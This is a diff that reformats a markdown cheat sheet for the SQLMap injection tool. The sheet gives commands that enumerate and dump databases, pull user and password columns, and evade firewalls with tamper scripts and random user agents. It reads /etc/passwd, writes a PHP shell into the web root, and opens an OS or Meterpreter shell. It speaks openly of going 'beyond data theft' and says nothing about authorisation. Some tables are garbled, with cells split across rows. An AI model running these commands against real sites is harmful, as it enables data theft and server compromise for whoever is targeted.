@@ -19,14 +19,14 @@ The --dbs flag helps you to extract all the database names. Once you get to know
 the database names, you can extract information about the tables of that
 database by using -D database_name --tables.
 
-```bash
+``` bash
 -D database_name -T table_name --dump
 ```
 
-if you see any web application using GET parameters in the URLs to retrieve
-data, you can test that URL with the -u flag in the SQLMap tool. This is
-considered to be HTTP GET-based testing. This approach is followed when the
-application uses GET parameters in the URL to retrieve data from the searches.
+if you see any web application using GET parameters in the URLs to retrieve data,
+you can test that URL with the -u flag in the SQLMap tool. This is considered to
+be HTTP GET-based testing. This approach is followed when the application uses
+GET parameters in the URL to retrieve data from the searches.
 
 URLs that have GET parameters can be vulnerable to SQL injection; let us scan
 this URL to identify if it has any SQL injection vulnerability.
@@ -136,13 +136,13 @@ sqlmap -r request.txt -D <db_name> -T <table_name> --dump --batch
 
 ##### Stealth Combo
 
-```bash
+``` bash
 --random-agent --tamper=space2comment,randomcase,charencode
 ```
 
 Common Tampers:
 
-```bash
+``` bash
 space2comment : Replaces spaces with /\*\*/
 
 randomcase : Changes SELECT to sElEcT
@@ -223,12 +223,12 @@ sqlmap -u "http://site.com/" --user-agent="MyBrowser*" --dbs
 
 Once you've found the tables, you don't always need to dump the entire database.
 
-| Goal                    | Command                                      |
-| ----------------------- | -------------------------------------------- |
-| Dump Specific Columns   | "-D db -T users -C ""user,password"" --dump" |
-| Dump First 5 Rows       | --start 1 --stop 5                           |
-| Search for Table Names  | "--search -T ""admin"""                      |
-| Search for Column Names | "--search -C ""pass""                        |
+| Goal                   |                           Command                            |
+|------------------------|--------------------------------------------------------------|
+| Dump Specific Columns  |"-D db -T users -C ""user,password"" --dump"                  |
+| Dump    First 5 Rows   |             --start 1 --stop 5                               |
+|Search   for Table Names|          "--search -T ""admin"""                             |
+|Search  for Column Names|            "--search -C ""pass""                             |
 
 ##### 🚀 The "Panic" Command
 
@@ -268,12 +268,12 @@ payloads cleaner: --dbms=mysql (or postgresql, mssql).
 If the database user has high privileges (like 'root' or 'sa'), you can go
 beyond data theft.
 
-| Command                       | Action                                                               |
-| ----------------------------- | -------------------------------------------------------------------- |
-| "--file-read=""/etc/passwd""" | Read a system file from the server.                                  |
-| "--file-write=""shell.php""   | --file-dest=""/var/www/html/""" Upload a file to the                 |
-| web                           | directory. --os-shell Attempt to gain an interactive command prompt. |
-| --os-pwn                      | Attempt to spawn a Meterpreter shell (requires Metasploit).          |
+|           Command           |                               Action                                |
+|-----------------------------|---------------------------------------------------------------------|
+|"--file-read=""/etc/passwd"""|                 Read a system file from the server.                 |
+| "--file-write=""shell.php"" |        --file-dest=""/var/www/html/""" Upload a file to the         |
+|             web             |directory. --os-shell Attempt to gain an interactive command prompt. |
+|          --os-pwn           |     Attempt to spawn a Meterpreter shell (requires Metasploit).     |
 
 #### 📋 The "Complete Checklist" One-Liner
 
@@ -283,21 +283,21 @@ If you want to run a thorough scan with every "best practice" enabled:
 sqlmap -u "http://target.com/id=1" --batch --random-agent --level=3 --risk=2 --threads=5 --dbs
 ```
 
-This command is essentially the "Advanced Standard" for professional scanning.
-It balances speed, stealth, and thoroughness.
+This command is essentially the "Advanced Standard" for professional scanning. It
+balances speed, stealth, and thoroughness.
 
 Here is the breakdown of each component:
 
 sqlmap The base command that launches the tool.
 
-```bash
+``` bash
 -u "<http://target.com/id=1>" The Target: Specifies the URL to test.
 ```
 
 Tip: Always wrap the URL in double quotes. This prevents the terminal from
 misinterpreting special characters like & or ? as shell commands.
 
-```bash
+``` bash
 --batch
 ```
 
@@ -307,60 +307,65 @@ automatically choose the default/recommended option for every question (e.g.,
 
 Use Case: Perfect for running scans in the background or within scripts.
 
-```bash
+``` bash
 --random-agent
 ```
 
-Stealth: SQLMap's default identity is often blocked by Firewalls. This flag
-picks a real, random browser identity (like Chrome on Windows or Safari on Mac)
-for every session.
+Stealth: SQLMap's default identity is often blocked by Firewalls.
+This flag picks a real, random browser identity (like Chrome on Windows or
+Safari on Mac) for every session.
 
 Result: It makes your automated traffic look like a human visitor.
 
-```bash
+``` bash
 --level=3
 ```
 
-Depth of Search: By default (Level 1), SQLMap only tests URL parameters.
+Depth of Search: By default (Level 1), SQLMap only tests URL
+parameters.
 
 Level 3 expands the search to include HTTP Headers (like Referer) and Cookies.
 This is crucial because many modern vulnerabilities are hidden in session data
 rather than the URL.
 
-```bash
+``` bash
 --risk=2
 ```
 
-Payload Intensity: Level 1 is safe and quiet.
+ Payload Intensity: Level 1 is safe and quiet.
 
 Risk 2 adds heavy query-based tests (like OR-based injections). While more
 effective, it carries a small risk of accidentally updating or changing data in
 the database. Use with caution on live production sites.
 
-```bash
+``` bash
 --threads=5
 ```
 
-Performance: SQLMap usually sends one request at a time. This tells it to send 5
-requests simultaneously.
+Performance: SQLMap usually sends one request at a time. This tells
+it to send 5 requests simultaneously.
 
 Result: It makes data extraction significantly faster.
 
 Note: Avoid going above 10, as it may crash the web server or trigger a DDoS
 alarm.
 
-```bash
+``` bash
 --dbs
 ```
 
-The Objective: This is the action flag. It tells SQLMap: "If you find a hole,
-don't just stop—list all the database names you can find."
+The Objective: This is the action flag. It tells SQLMap: "If you find a
+hole, don't just stop—list all the database names you can find."
 
-| Flag | Category | Purpose ||
+|                 Flag | Category | Purpose                        ||
 |------------------------------------------------------------------||
-|------------------------------------------------------------------|| | -u
-|Targeting | Where to attack. || | --batch |Automation| Hands-free operation. ||
-|--random-agent |Stealth |Bypass basic User-Agent filters.|| | --level=3 | Depth
-| Scan Headers and Cookies. || | --risk=2 |Intensity | Use more aggressive
-payloads. || | --threads=5 | Speed | Faster data retrieval. || | --dbs |Goal
-|Enumerate all databases. || | || | ||
+|------------------------------------------------------------------||
+|             -u       |Targeting | Where to attack.               ||
+|        --batch       |Automation| Hands-free operation.          ||
+|--random-agent        |Stealth   |Bypass basic User-Agent filters.||
+|       --level=3      | Depth    | Scan Headers and Cookies.      ||
+|    --risk=2          |Intensity | Use more aggressive payloads.  ||
+|        --threads=5   | Speed    | Faster data retrieval.         ||
+|          --dbs       |Goal      |Enumerate all databases.        ||
+|                                                                  ||
+|                                                                  ||
